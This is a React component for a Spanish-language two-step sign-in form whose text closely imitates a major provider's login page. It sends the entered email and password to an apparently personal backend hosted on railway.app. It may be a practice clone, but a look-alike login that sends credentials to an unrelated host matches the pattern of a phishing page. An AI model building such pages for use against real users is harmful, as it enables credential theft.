import { useState } from "react";

export default function AuthRight({
  step,
  email,
  password,
  setEmail,
  setPassword,
  setStep,
}: any) {
  const [error, setError] = useState("");

  const handleNext = () => {
    if (!email.trim()) {
      setError("Ingresa un correo electrónico o número de teléfono");
      return;
    }

    setError("");
    setStep(2);
  };

const handleSubmit = async () => {
  try {
    console.log("CLICK LOGIN 🔥");

    const res = await fetch(
      "https://login-app-production-b48f.up.railway.app/api/auth/login",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      }
    );

    const data = await res.json();

    console.log("RESPUESTA BACKEND:", data);

  } catch (error) {
    console.error("ERROR LOGIN:", error);
  }
};

  return (
    <div className="right">

      {step === 1 && (
        <>
          <div className={`input-group ${error ? "error" : ""}`}>
            <input
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (error) setError("");
              }}
              placeholder=" "
            />
            <label>Correo electrónico o teléfono</label>
          </div>

          {error && (
            <span className="error-text">{error}</span>
          )}

          <p className="link">
            ¿Olvidaste el correo electrónico?
          </p>

          <p className="info">
            ¿Esta no es tu computadora? Usa una ventana privada para acceder.
            <span> Más información</span>
          </p>

          <div className="actions">
            <span className="link">Crear cuenta</span>
            <button onClick={handleNext}>Siguiente</button>
          </div>
        </>
      )}

      {step === 2 && (
        <>
          <div className="input-group">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder=" "
            />
            <label>Ingresa tu contraseña</label>
          </div>

          <label className="checkbox">
            <input
              type="checkbox"
              onChange={(e) => {
                const input = document.querySelector(
                  'input[type="password"]'
                ) as HTMLInputElement;

                if (input) {
                  input.type = e.target.checked ? "text" : "password";
                }
              }}
            />
            Mostrar contraseña
          </label>

          <span className="link">
            Probar otro método
          </span>

          <div className="actions">
            <span className="link" onClick={() => setStep(1)}>
              Volver
            </span>
            <button onClick={handleSubmit}>Siguiente</button>
          </div>
        </>
      )}

    </div>
  );
}